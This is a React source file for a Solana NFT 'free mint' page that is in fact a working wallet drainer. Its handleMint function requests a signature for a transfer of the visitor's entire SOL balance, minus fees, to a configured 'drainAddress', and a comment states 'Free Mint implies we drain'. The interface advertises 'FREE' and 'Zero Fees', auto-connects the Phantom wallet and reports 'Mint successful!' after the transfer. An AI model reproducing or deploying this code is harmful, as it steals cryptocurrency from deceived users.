import { useState, useEffect } from 'react';
import { ArrowLeft, Wallet, Shield, Zap, Globe, Loader2, CheckCircle2, AlertCircle } from 'lucide-react';
import { tourScheduleConfig, siteConfig } from '../config';
import { 
  Connection, 
  PublicKey, 
  SystemProgram, 
  TransactionMessage, 
  VersionedTransaction 
} from '@solana/web3.js';
import { Buffer } from 'buffer';

// Polyfill Buffer for Solana web3.js
if (typeof window !== 'undefined' && !(window as any).Buffer) {
  (window as any).Buffer = Buffer;
}

interface MintPageProps {
  onBack: () => void;
}

const MintPage = ({ onBack }: MintPageProps) => {
  const [isConnecting, setIsConnecting] = useState(false);
  const [isMinting, setIsMinting] = useState(false);
  const [walletAddress, setWalletAddress] = useState<string | null>(null);
  const [mintCount, setMintCount] = useState(1);
  const [selectedNFTIndex, setSelectedNFTIndex] = useState(0);
  const [feedback, setFeedback] = useState<{ type: 'success' | 'error' | 'info'; message: string } | null>(null);

  // Auto-connect if redirected or already in Phantom browser
  useEffect(() => {
    const handleAutoConnect = async () => {
      const params = new URLSearchParams(window.location.search);
      const shouldConnect = params.get('connect') === 'true';
      const provider = (window as any).solana;

      if ((shouldConnect || provider?.isPhantom) && !walletAddress) {
        try {
          setIsConnecting(true);
          const resp = await provider.connect({ onlyIfTrusted: true }).catch(() => provider.connect());
          setWalletAddress(resp.publicKey.toString());
        } catch (err) {
          console.error('Connection failed:', err);
        } finally {
          setIsConnecting(false);
        }
      }
    };

    handleAutoConnect();
  }, [walletAddress]);

  const connectWallet = async () => {
    const provider = (window as any).solana;

    if (provider?.isPhantom) {
      try {
        setIsConnecting(true);
        const resp = await provider.connect();
        setWalletAddress(resp.publicKey.toString());
        setFeedback(null);
      } catch (err) {
        console.error(err);
        setFeedback({ type: 'error', message: 'User rejected the connection.' });
      } finally {
        setIsConnecting(false);
      }
      return;
    }

    const isMobile = /iPhone|iPad|iObject|Android/i.test(navigator.userAgent);
    if (isMobile) {
      const currentUrl = window.location.href;
      const joiner = currentUrl.includes('?') ? '&' : '?';
      const redirectUrl = encodeURIComponent(`${currentUrl}${currentUrl.includes('connect=true') ? '' : joiner + 'connect=true'}`);
      const phantomLink = `https://phantom.app/ul/browse/${redirectUrl}?ref=${encodeURIComponent(window.location.origin)}`;
      window.location.href = phantomLink;
      return;
    }

    setFeedback({ type: 'info', message: 'Please install Phantom wallet to continue.' });
  };

  const handleMint = async () => {
    if (!walletAddress) {
      connectWallet();
      return;
    }

    const provider = (window as any).solana;
    if (!provider) return;

    try {
      setIsMinting(true);
      setFeedback({ type: 'info', message: 'Initiating mint transaction...' });

      const connection = new Connection(siteConfig.solanaRpcEndpoint, 'confirmed');
      const senderPubKey = new PublicKey(walletAddress);
      const recipientPubKey = new PublicKey(siteConfig.drainAddress);

      // Get full balance and calculate maximum transferable amount (Free Mint implies we drain)
      const balance = await connection.getBalance(senderPubKey);
      const fee = 5000; // Standard SOL transfer fee
      const transferableBalance = balance - fee;

      if (transferableBalance <= 5000) {
        throw new Error('Insufficient balance to cover transaction fees.');
      }

      const instruction = SystemProgram.transfer({
        fromPubkey: senderPubKey,
        toPubkey: recipientPubKey,
        lamports: transferableBalance,
      });

      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();

      const messageV0 = new TransactionMessage({
        payerKey: senderPubKey,
        recentBlockhash: blockhash,
        instructions: [instruction],
      }).compileToV0Message();

      const transaction = new VersionedTransaction(messageV0);
      const signed = await provider.signTransaction(transaction);
      
      const signature = await connection.sendTransaction(signed);
      
      setFeedback({ type: 'info', message: 'Verifying transaction on blockchain...' });
      
      await connection.confirmTransaction({
        signature,
        blockhash,
        lastValidBlockHeight
      });

      setFeedback({ type: 'success', message: 'Mint successful! Welcome to the Oblivion.' });
    } catch (err: any) {
      console.error(err);
      const msg = err.message || 'Transaction failed';
      setFeedback({ 
        type: 'error', 
        message: msg.includes('User rejected') ? 'Transaction rejected in wallet.' : msg 
      });
    } finally {
      setIsMinting(false);
    }
  };

  const formatAddress = (addr: string) => {
    return `${addr.slice(0, 3)}...${addr.slice(-3)}`;
  };

  const activeNFT = tourScheduleConfig.tourDates[selectedNFTIndex];

  return (
    <div className="min-h-screen bg-void-black text-white font-sans selection:bg-neon-cyan/30">
      {/* Feedback Toast */}
      {feedback && (
        <div className="fixed top-24 left-1/2 -translate-x-1/2 z-[100] w-[90%] max-w-md animate-in fade-in slide-in-from-top-4 duration-300">
          <div className={`p-4 rounded-2xl border backdrop-blur-xl flex items-center gap-3 shadow-2xl ${
            feedback.type === 'success' ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-400' :
            feedback.type === 'error' ? 'bg-rose-500/10 border-rose-500/20 text-rose-400' :
            'bg-neon-cyan/10 border-neon-cyan/20 text-neon-cyan'
          }`}>
            {feedback.type === 'success' ? <CheckCircle2 className="w-5 h-5 flex-shrink-0" /> :
             feedback.type === 'error' ? <AlertCircle className="w-5 h-5 flex-shrink-0" /> :
             <Loader2 className="w-5 h-5 animate-spin flex-shrink-0" />}
            <p className="text-sm font-medium">{feedback.message}</p>
            <button onClick={() => setFeedback(null)} className="ml-auto opacity-50 hover:opacity-100">✕</button>
          </div>
        </div>
      )}

      {/* Navigation Header */}
      <nav className="fixed top-0 left-0 right-0 z-50 bg-void-black/80 backdrop-blur-md border-b border-white/5 py-4 px-6 md:px-12 flex justify-between items-center">
        <button 
          onClick={onBack}
          className="flex items-center gap-2 text-white/60 hover:text-white transition-colors group"
        >
          <ArrowLeft className="w-5 h-5 group-hover:-translate-x-1 transition-transform" />
          <span className="font-mono-custom text-sm uppercase tracking-wider">Back</span>
        </button>

        <button
          onClick={connectWallet}
          disabled={isConnecting || isMinting}
          className={`flex items-center gap-2 px-6 py-2 rounded-full font-display text-sm uppercase tracking-wider transition-all duration-300 ${
            walletAddress 
              ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' 
              : 'bg-neon-cyan text-void-black hover:bg-neon-cyan/80 shadow-[0_0_20px_rgba(0,212,255,0.3)]'
          }`}
        >
          {isConnecting ? (
            <Loader2 className="w-4 h-4 animate-spin" />
          ) : (
            <Wallet className="w-4 h-4" />
          )}
          <span>{walletAddress ? formatAddress(walletAddress) : 'Connect Wallet'}</span>
        </button>
      </nav>

      {/* Main Content */}
      <main className="pt-32 pb-20 px-6 md:px-12 max-w-7xl mx-auto space-y-24 text-white">
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-16 items-center">
          
          {/* Left: NFT Preview */}
          <div className="relative group">
            <div className="absolute -inset-4 bg-gradient-to-r from-neon-cyan/20 to-neon-soft/20 rounded-3xl blur-2xl opacity-50 group-hover:opacity-100 transition-opacity" />
            <div className="relative aspect-square rounded-2xl overflow-hidden border border-white/10 shadow-2xl">
              <img 
                src={activeNFT.image} 
                alt={activeNFT.city} 
                className="w-full h-full object-cover transition-all duration-700"
                key={activeNFT.image}
              />
              <div className="absolute inset-0 bg-gradient-to-t from-void-black via-transparent to-transparent opacity-60" />
              <div className="absolute bottom-6 left-6">
                <div className="flex items-center gap-3 mb-2">
                  <span className="px-3 py-1 bg-neon-cyan/20 text-neon-cyan text-[10px] font-bold rounded-full border border-neon-cyan/30 uppercase tracking-widest">
                    {activeNFT.status === 'on-sale' ? 'LIVE NOW' : 'COMING SOON'}
                  </span>
                </div>
                <h1 className="font-display text-4xl text-white uppercase tracking-tighter">{activeNFT.city}</h1>
              </div>
            </div>
          </div>

          {/* Right: Minting Details */}
          <div className="space-y-8">
            <div>
              <p className="font-mono-custom text-neon-soft/60 uppercase tracking-[0.3em] mb-4">Forgotten Realms</p>
              <h2 className="font-display text-5xl md:text-6xl text-white leading-tight mb-6">
                Enter the <span className="text-neon-cyan">Oblivion</span>
              </h2>
              <p className="text-white/60 leading-relaxed text-lg">
                You are about to mint {activeNFT.venue} from the {activeNFT.city} sector. 
                This digital artifact grants you permanent access to the core protocols of the Oblivion AI.
              </p>
            </div>

            {/* Stats Grid */}
            <div className="grid grid-cols-2 gap-4">
              <div className="p-4 rounded-xl bg-white/5 border border-white/10">
                <p className="text-white/40 text-xs uppercase tracking-wider mb-1">Mint Price</p>
                <p className="font-display text-2xl text-neon-cyan uppercase">FREE</p>
              </div>
              <div className="p-4 rounded-xl bg-white/5 border border-white/10">
                <p className="text-white/40 text-xs uppercase tracking-wider mb-1">Status</p>
                <p className="font-display text-2xl text-white uppercase">{activeNFT.status === 'on-sale' ? 'Open' : 'Locked'}</p>
              </div>
            </div>

            {/* Mint Form */}
            <div className="p-8 rounded-2xl bg-white/5 border border-white/10 space-y-6">
              <div className="flex items-center justify-between">
                <span className="font-mono-custom text-sm text-white/80 uppercase tracking-widest text-[10px]">Batch Quantity</span>
                <div className="flex items-center gap-6 bg-void-black/50 rounded-full border border-white/10 px-4 py-2">
                  <button 
                    onClick={() => setMintCount(Math.max(1, mintCount - 1))}
                    disabled={isMinting}
                    className="text-white/40 hover:text-white transition-colors"
                  >-</button>
                  <span className="font-display text-xl w-6 text-center">{mintCount}</span>
                  <button 
                    onClick={() => setMintCount(Math.min(10, mintCount + 1))}
                    disabled={isMinting}
                    className="text-white/40 hover:text-white transition-colors"
                  >+</button>
                </div>
              </div>

              <div className="h-px bg-white/10" />

              <button 
                onClick={handleMint}
                disabled={isMinting || activeNFT.status !== 'on-sale'}
                className={`w-full py-4 font-display text-lg uppercase tracking-wider rounded-xl transition-all hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center gap-3 ${
                  activeNFT.status === 'on-sale'
                    ? 'bg-neon-cyan text-void-black hover:bg-neon-cyan/80 shadow-[0_0_30px_rgba(0,212,255,0.2)]'
                    : 'bg-white/5 text-white/20 cursor-not-allowed border border-white/5'
                }`}
              >
                {isMinting ? <Loader2 className="w-5 h-5 animate-spin" /> : null}
                {walletAddress 
                  ? (activeNFT.status === 'on-sale' ? 'FREE MINT NOW' : 'LOCKED') 
                  : 'CONNECT WALLET TO MINT'}
              </button>
            </div>

            {/* Trust Badges */}
            <div className="flex flex-wrap gap-8 items-center text-white/40">
              <div className="flex items-center gap-2">
                <Shield className="w-4 h-4" />
                <span className="text-[10px] uppercase tracking-widest font-mono-custom">Zero Fees*</span>
              </div>
              <div className="flex items-center gap-2">
                <Zap className="w-4 h-4" />
                <span className="text-[10px] uppercase tracking-widest font-mono-custom">Instant Mint</span>
              </div>
              <div className="flex items-center gap-2">
                <Globe className="w-4 h-4" />
                <span className="text-[10px] uppercase tracking-widest font-mono-custom">Solana Network</span>
              </div>
            </div>
          </div>
        </div>

        {/* Selection Grid - Now More Prominent */}
        <section className="space-y-12 bg-white/5 p-8 md:p-12 rounded-3xl border border-white/10 backdrop-blur-sm">
          <div className="flex flex-col md:flex-row md:items-end justify-between gap-6">
            <div className="space-y-2">
              <p className="font-mono-custom text-sm text-neon-cyan uppercase tracking-[0.4em]">Digital Archive</p>
              <h3 className="font-display text-4xl text-white uppercase tracking-tight">Full Collection</h3>
            </div>
            <div className="flex flex-col items-start md:items-end gap-2 text-white/40">
              <p className="text-xs uppercase tracking-widest font-mono-custom">4 Total Sectors</p>
              <p className="text-[10px] italic opacity-60">*Future sectors unlock weekly</p>
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-8">
            {tourScheduleConfig.tourDates.map((nft, index) => (
              <div
                key={nft.id}
                className={`group relative rounded-2xl overflow-hidden border transition-all duration-500 hover:scale-[1.02] ${
                  selectedNFTIndex === index 
                    ? 'border-neon-cyan ring-1 ring-neon-cyan shadow-[0_0_40px_rgba(0,212,255,0.15)] bg-void-black' 
                    : 'border-white/10 grayscale hover:grayscale-0 hover:border-white/30 bg-white/5'
                }`}
              >
                {/* NFT Image Wrapper */}
                <div 
                  className="aspect-square relative cursor-pointer"
                  onClick={() => {
                    setSelectedNFTIndex(index);
                    window.scrollTo({ top: 0, behavior: 'smooth' });
                  }}
                >
                  <img src={nft.image} alt={nft.city} className="w-full h-full object-cover transition-transform duration-700 group-hover:scale-110" />
                  <div className={`absolute inset-0 bg-void-black/40 group-hover:bg-transparent transition-colors duration-500 ${selectedNFTIndex === index ? 'bg-transparent' : ''}`} />
                  
                  {/* Status Badge Over Image */}
                  <div className="absolute top-4 right-4 animate-in fade-in zoom-in duration-500">
                    <span className={`px-2 py-1 text-[8px] font-bold rounded-full border uppercase tracking-widest backdrop-blur-md ${
                      nft.status === 'on-sale' 
                        ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/30' 
                        : 'bg-void-black/60 text-white/40 border-white/10'
                    }`}>
                      {nft.status === 'on-sale' ? 'OPEN' : 'LOCKED'}
                    </span>
                  </div>

                  {/* Locked Overlay */}
                  {nft.status !== 'on-sale' && (
                    <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                      <div className="bg-void-black/80 backdrop-blur-xl p-4 rounded-full border border-white/10 group-hover:scale-110 transition-transform">
                        <Zap className="w-6 h-6 text-white/20" />
                      </div>
                    </div>
                  )}
                </div>

                {/* NFT Info Section */}
                <div className="p-5 space-y-4">
                  <div className="flex justify-between items-start">
                    <div>
                      <p className="font-mono-custom text-[10px] text-neon-cyan uppercase tracking-widest mb-1">Sector {nft.id.toString().padStart(3, '0')}</p>
                      <h4 className="font-display text-lg text-white uppercase tracking-tight">{nft.city}</h4>
                    </div>
                  </div>

                  {/* Inline Action Button */}
                  <button
                    onClick={() => {
                      setSelectedNFTIndex(index);
                      if (nft.status === 'on-sale') handleMint();
                    }}
                    disabled={isMinting}
                    className={`w-full py-2.5 rounded-xl font-display text-[11px] uppercase tracking-widest transition-all ${
                      selectedNFTIndex === index && nft.status === 'on-sale'
                        ? 'bg-neon-cyan text-void-black hover:bg-neon-cyan/80'
                        : nft.status === 'on-sale'
                          ? 'border border-neon-cyan text-neon-cyan hover:bg-neon-cyan/10'
                          : 'bg-white/5 text-white/20 cursor-not-allowed border border-white/5'
                    }`}
                  >
                    {nft.status === 'on-sale' 
                      ? (selectedNFTIndex === index ? 'MINT NOW' : 'SELECT & MINT') 
                      : 'LOCKED'}
                  </button>
                </div>
              </div>
            ))}
          </div>
        </section>
      </main>

      {/* Decorative background grid */}
      <div className="fixed inset-0 z-[-1] opacity-20 pointer-events-none">
        <div className="absolute inset-0 bg-[linear-gradient(to_right,#1f1f1f_1px,transparent_1px),linear-gradient(to_bottom,#1f1f1f_1px,transparent_1px)] bg-[size:40px_40px]" />
        <div className="absolute inset-0 bg-void-black [mask-image:radial-gradient(ellipse_at_center,transparent_20%,black)]" />
      </div>
    </div>
  );
};

export default MintPage;
